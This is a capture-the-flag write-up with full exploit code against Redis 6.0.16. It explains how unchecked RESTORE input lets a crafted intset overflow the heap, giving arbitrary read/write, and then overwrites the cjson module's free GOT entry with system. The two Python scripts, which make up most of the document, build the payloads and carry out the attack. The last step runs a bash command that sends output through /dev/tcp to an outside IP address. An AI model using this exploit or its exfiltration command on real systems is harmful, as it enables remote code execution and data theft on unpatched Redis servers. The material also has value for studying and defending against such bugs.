# hardenedredis

We are given an ubuntu 22.04 docker container, installing the latest redis version.
Turns out, it is not really the latest redis version, but still with some CVE fixes.
I scoured through the commit log to find anything interesting and went down a few rabbit holes:
- Old lua version
- messagepack lua extension
- unfixed CVE in lua script execution
- many many more

After more scouring of the commit log, I realized that the `RESTORE` command was fundamentally very broken on the redis version we were given.
Indeed it was basically not doing any checks at all on the input byte string.
I first tried to exploit some of the things that were fixed with later commits, but the data structures used were very complex and did not lend themselves to easy heap overflows.
In the end, I settled on intsets, which look like the following:

```c
typedef struct intset {
    uint32_t encoding;
    uint32_t length;
    int8_t contents[];
} intset;
```

Thanks to the restore commands, I control both the size of the allocated chunk where the intset is stored and its contents.
I could therefore make the length larger than the actual chunk.
By then deleting an entry, I would move items outside of the chunk by one to the left, i.e. overwriting things on the heap.
I used this to corrupt a string and have a string of length `-1`.
Using this string, I then had full arbitrary read/write.
I then overwrote the free pointer in the got of the cjson load module.
By making it point to system, I could execute arbitrary commands, by decoding the command as a json string.

The two scripts below showcase the exploit.

## coder.py
```python
from pwn import *
from pycrc.algorithms import Crc


def crc64(buffer):
    crc_io = process(["./crc", str(len(buffer))])
    crc_io.send(buffer)
    crc = int(crc_io.recvline().strip().decode(), 0)
    return crc
    # crc = Crc(64, 0xad93d23594c935a9, True, 0xffffffffffffffff, True, 0x0000000000000000)
    # return crc.bit_by_bit_fast(buffer)

class ZipList:
    def __init__(self) -> None:
        self.entry_data = b""
        self.num_entries = 0
        self.zlbytes = None
        self.zltail = None
        self.zllen = None
        self.zlend = None
        self.last_off = 4 + 4 + 2
        self.prevlen = 0

    def encode(self) -> bytes:
        ret = b""
        if self.zlend is None:
            self.zlend = 0xff
        if self.zllen is None:
            self.zllen = self.num_entries
        if self.zltail is None:
            self.zltail = self.last_off
        if self.zlbytes is None:
            self.zlbytes = len(self.entry_data) + 11
        ret += p32(self.zlbytes)
        ret += p32(self.zltail)
        ret += p16(self.zllen)
        ret += self.entry_data
        ret += p8(self.zlend)
        return ret

    def enc_prevlen(self, val: int):
        if val <= 253:
            return p8(val)
        return p8(0xfe) + p32(val)


    def append_entry_raw(self, data):
        self.num_entries += 1
        data = self.enc_prevlen(self.prevlen) + data
        self.entry_data += data
        self.last_off += self.prevlen
        self.prevlen = len(data)

    def enc_entry(self, val, my_len=None):
        if isinstance(val, bytes):
            len_enc = len(val)
            if my_len is not None:
                len_enc = my_len
            return p8(0b10000000), p32(len_enc, endian="big"), val

    def append_entry(self, val, my_len=None):
        enc, add_len, enc_val = self.enc_entry(val, my_len)
        data = enc + add_len + enc_val
        self.append_entry_raw(data)

RDB_TYPE_STRING = 0
RDB_TYPE_LIST =   1
RDB_TYPE_SET =    2
RDB_TYPE_ZSET =   3
RDB_TYPE_HASH =   4
RDB_TYPE_ZSET_2 = 5
RDB_TYPE_MODULE = 6
RDB_TYPE_MODULE_2 = 7
RDB_TYPE_HASH_ZIPMAP =    9
RDB_TYPE_LIST_ZIPLIST =  10
RDB_TYPE_SET_INTSET =    11
RDB_TYPE_ZSET_ZIPLIST =  12
RDB_TYPE_HASH_ZIPLIST =  13
RDB_TYPE_LIST_QUICKLIST = 14
RDB_TYPE_STREAM_LISTPACKS = 15

class RDB:
    def __init__(self, typ: int) -> None:
        self.entry_data = b""
        self.typ = typ

    def encode(self):
        return p8(self.typ) + self.entry_data

    def append_entry_raw(self, data):
        self.entry_data += data

    def append_len(self, len):
        # TODO: encoded lens
        len_data = p8(0x81) + p64(len, endian="big")
        self.append_entry_raw(len_data)

    def append_bs(self, data: bytes):
        self.append_len(len(data))
        self.append_entry_raw(data)

def intset(length, contents: bytes, enc=8):
    return p32(enc) + p32(length) + contents


def encode_dump(data: bytes):
    # TODO: CRC64
    version = 9
    data = data + p16(version)
    crc = crc64(data)
    footer = p64(crc)
    return data + footer

def format_escaped(data: bytes):
    ret = ""
    for b in data:
        ret += f"\\x{b:02x}"
    return ret

OBJ_ENCODING_RAW = 0     # /* Raw representation */
OBJ_ENCODING_INT = 1     # /* Encoded as integer */
OBJ_ENCODING_HT = 2      # /* Encoded as hash table */
OBJ_ENCODING_ZIPMAP = 3  # /* Encoded as zipmap */
OBJ_ENCODING_LINKEDLIST = 4 # /* No longer used: old list encoding. */
OBJ_ENCODING_ZIPLIST = 5 # /* Encoded as ziplist */
OBJ_ENCODING_INTSET = 6  # /* Encoded as intset */
OBJ_ENCODING_SKIPLIST = 7  # /* Encoded as skiplist */
OBJ_ENCODING_EMBSTR = 8  # /* Embedded sds string encoding */
OBJ_ENCODING_QUICKLIST = 9 # /* Encoded as linked list of ziplists */
OBJ_ENCODING_STREAM = 10 # /* Encoded as a radix tree of listpacks */

OBJ_STRING = 0 #    /* String object. */
OBJ_LIST = 1 #      /* List object. */
OBJ_SET = 2 #       /* Set object. */
OBJ_ZSET = 3 #      /* Sorted set object. */
OBJ_HASH = 4 #      /* Hash object. */

SDS_TYPE_5 =  0
SDS_TYPE_8 =  1
SDS_TYPE_16 = 2
SDS_TYPE_32 = 3
SDS_TYPE_64 = 4

# z = ZipList()
# z.append_entry(b"lmao\0", 0x1000)
# # print(z.entry_data)
# # z.append_entry(b"meme")

# final_pay = z.encode()

# print("ZIPLISt:")
# print(hexdump(final_pay))

# r = RDB(RDB_TYPE_LIST_QUICKLIST)
# r.append_len(1)
# r.append_bs(final_pay)
# rdb_pay = r.encode()
# dumped = encode_dump(rdb_pay)

# print(f"restore asdf 0 \"{format_escaped(dumped)}\"")

# myis = intset(10, b"\0"*0x38)
# r = RDB(RDB_TYPE_SET_INTSET)
# r.append_bs(myis)
# dumped = encode_dump(r.encode())

# print(f"restore lmao 0 \"{format_escaped(dumped)}\"")

# print(format_escaped(z.encode()))
```

## exploit.py
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 47.88.50.1 --port 9999 redis-6.0.16/redis-server
from pwn import *
from coder import *
import redis

# Set up pwntools for the correct architecture
exe = context.binary = ELF('redis-6.0.16/redis-server')
context.terminal = ["tmux", "split", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '47.88.50.1'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    # cleanup old db
    os.system("rm -rf /var/lib/redis/dump.rdb")
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=["./redis.conf"], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set substitute-path /build/redis-6i8WL9/ /home/vagrant/CTF/rwctf/
# b scanGenericCommand
# b lookupStringForBitCommand
# b bitops.c:580
# b readQueryFromClient
b system
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled


io = start()
rem_port = 6379
r_host = "10.10.20.1"
if args.REMOTE:
    io.sendlineafter(b"token now:", b"GpBQe0iTSLeTuaXxfmtf/A==")
    io.recvuntil(b"Now your new port is :")
    rem_port = int(io.recvline().strip())
    log.info("got remote port: %d", rem_port)
    r_host = host
    # io.interactive()
time.sleep(1.0)
if args.LOCAL:
    r_host = "localhost"
r = redis.Redis(r_host, rem_port, db=0)

fake_sdshdr8 = flat({
    0: p8(0xff, sign=False),
    1: p8(0xff, sign=False),
    2: p8(SDS_TYPE_8)
})

# create two strings
str_pay = cyclic(0x40-4)
for i in range(12):
    name = f"spr{i:02}".encode()
    r.set(f"spray{i}", name + fake_sdshdr8 + str_pay[:-8])

myis = intset(9, b"\0"*0x38)
rdb = RDB(RDB_TYPE_SET_INTSET)
rdb.append_bs(myis)
dumped = encode_dump(rdb.encode())

log.info("sprayed!")

# pause()

r.delete("spray5")

log.info("deleted spray5")

# pause()

# time.sleep(1.0)
r.memory_purge()

log.info("purged memory")
# pause()

time.sleep(0.5)

r.restore("lmao", 0, dumped)

# time.sleep(0.5)
# r.set("a", str_pay)
# time.sleep(0.5)
# r.set("b", str_pay)
# time.sleep(0.5)

def dec_elem(elem: bytes):
    return int(elem.decode(), 0)

elems = r.sscan("lmao", 0)
elems = elems[1]
print(elems)
# spray6_addr = dec_elem(elems[8])

# log.info("spray6 @ 0x%x", spray6_addr)

del_target = dec_elem(elems[7])

# pause()

r.srem("lmao", del_target)

def set_bytes(key, bs: bytes, off=0):
    return r.setrange(key, off, bs)
    curr = off*8
    for b in bs:
        for i in range(8):
            bit = (b >> (7 - i)) & 1
            r.setbit(key, curr + i, bit)
        curr += 8

def get_bytes(key, size, off=0):
    return r.getrange(key, off, off+size)
    base = off*8
    ret = b""
    for k in range(size):
        b = 0
        for i in range(8):
            bit = r.getbit(key, base + k*8 + i)
            b |= (bit << (7 - i))
        ret += bytes([b])
    return ret

# pause()

# res = r.get("spray6")

# print(hexdump(res))

# sp7_obj = res[0x2d:]

sp7_cont_off = 0x40

# print(hexdump(sp7_obj))

# typ_enc_lru = u32(sp7_obj[:4])
# refcount = u32(sp7_obj[4:8])
# ptr = u64(sp7_obj[8:16])

# sp7_addr = ptr - 3 - 0x10

# we want large one
# fake_sp7_shdr_addr = sp7_addr + 0x10 + 0x17

uint64_max = (1 << 64) - 1

fake_sdshdr64 = flat({
        # fake sdshdr64
        0: p64(uint64_max, sign=False),
        8: p64(uint64_max, sign=False),
        16: p8(SDS_TYPE_64)
})


# fake_sp7 = flat({
#     0: p32(typ_enc_lru),
#     4: p32(refcount),
#     8: p64(fake_sp7_shdr_addr),
#     16: fake_sdshdr64
# })

# set_bytes("spray6", fake_sp7, 0x2d)
set_bytes("spray6", fake_sdshdr64, sp7_cont_off - len(fake_sdshdr64))

log.info("faked spray7")

# res = r.get("spray6")

# sp7_obj = res[0x2d:]

# print(hexdump(sp7_obj))

# pause()

for i in range(0x3):
    r.set(f"ssmall{i}", cyclic(44))

# r.delete("spray8")
# r.delete("spray9")

# lua_pay = """
# return tostring(cjson.encode)
# end

# arr = {}
# _G["lmao"] = arr

# function tricked()
# """

# print(r.eval(lua_pay, 0))

# r.delete("spray10")

# lua_pay = """
# return _G["lmao"]
# end

# _G["lmao"][1] = 0

# function tricked2()
# """

# print(r.eval(lua_pay, 0))

# pause()

# lua_pay = """
# return _G["lmao"]
# end

# _G["lmao"][2] = 156842099844.517639160156250000000000000000

# function tricked2()
# """

# print(r.eval(lua_pay, 0))

# pause()


liblua_off = 0x200-3 + 0x07a0

# useful_ptr_off = 0x02b0-3
useful_ptr_off = 0x105

res = r.getrange("spray7", 0, 0x400)
print(hexdump(res))

res = get_bytes("spray7", 0x10, useful_ptr_off)
print(hexdump(res))

useful_ptr = u64(res[:8])

log.info("useful_ptr = 0x%x", useful_ptr)
sp7_addr = useful_ptr - (useful_ptr_off + 8 + 3)
log.success("s7 @ 0x%x", sp7_addr)

heap_base = sp7_addr - 0x7ffff66ed183 + 0x00007ffff6200000
if not args.LOCAL:
    heap_base = sp7_addr - 0xcd9103
log.success("heap @ 0x%x", heap_base)

lua_state_off = 0x00007ffff66b1000-0x7ffff66ed183
lua_state_addr = sp7_addr + lua_state_off
log.success("lua_state @ 0x%x", lua_state_addr)

conn_off = 0x00007ffff66edf40 - 0x7ffff66ed183
conn_addr = sp7_addr + conn_off
log.success("conn @ 0x%x", conn_addr)


fake_vtable_off = 0x20
fake_vtable_addr = sp7_addr + fake_vtable_off
fake_vtable = flat({
    0: p64(0x41414141),
    8: p64(0x42424242),
    16: p64(0x43434343)
})

# set_bytes("spray7", fake_vtable, fake_vtable_off)

liblua = ELF("liblua-cjson.so")

# lua_pay = """
# local arr = {}
# arr[1] = cjson.json_encode
# return arr
# """

# print(r.eval(lua_pay, 0))

# lua_pay = """
# local arr = {}
# arr[1] = cjson.json_encode
# arr[2] = cjson.json_encode
# return arr
# """

# print(r.eval(lua_pay, 0))

# lua_pay = """
# local arr = {}
# arr[1] = cjson.json_encode
# arr[2] = cjson.json_encode
# arr[3] = cjson.json_encode
# return arr
# """

# print(r.eval(lua_pay, 0))

lua_pay = """
return tostring(cjson.encode)
"""

res = r.eval(lua_pay, 0).decode()

print(res)

# pause()

# res = get_bytes("spray7", 0x8000, 0)
# print(hexdump(p64(liblua.symbols["json_encode"])))
# print(hexdump(res))

enc_fn = res.split("function: ")[1]
json_encode_addr_addr = int(enc_fn, 16)+0x20
log.info("json_encode_addr_addr = 0x%x", json_encode_addr_addr)
log.info("off = 0x%x",  json_encode_addr_addr - sp7_addr)
res = get_bytes("spray7", 0x10, json_encode_addr_addr - sp7_addr)
json_encode_addr = u64(res[:8])
log.info("json_encode_addr = 0x%x", json_encode_addr)

liblua.address = liblua_json_addr = json_encode_addr - liblua.symbols["json_encode"]
log.success("liblua_json @ 0x%x", liblua_json_addr)

free_got = liblua.got["free"]

free_sp7_off = free_got - sp7_addr

snprintf_off = liblua.got["__snprintf_chk"] - sp7_addr

log.info("off = 0x%x")

fputc_addr = u64(get_bytes("spray7", 16, snprintf_off)[:8])
log.info("fputc_addr = 0x%x", fputc_addr)

libc = ELF("libc.so.6")
libc.address = libc_base = fputc_addr - libc.symbols["__snprintf_chk"]
log.success("libc @ 0x%x", libc_base)

set_bytes("spray7", p64(libc.symbols["system"]), free_sp7_off)
# fake_conn = flat({

# })

# r.setrange("spray7", conn_off+0x30, cyclic(0x40))

# set_bytes("spray7", b"b"*8, liblua_off - 0x20)
# set_bytes("spray7", p64(0x414141414141), liblua_off)

# pause()

lua_pay = """
return cjson.decode("\\"/bin/bash -c \\\\\\"/readflag > /dev/tcp/84.72.193.30/1334\\\\\\"\\"")
"""

# pause()

print(r.eval(lua_pay, 0))

# res = get_bytes("spray7", 0x300)
# print(hexdump(res))

# res = get_bytes("spray6", 0x60)
# print(res)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```
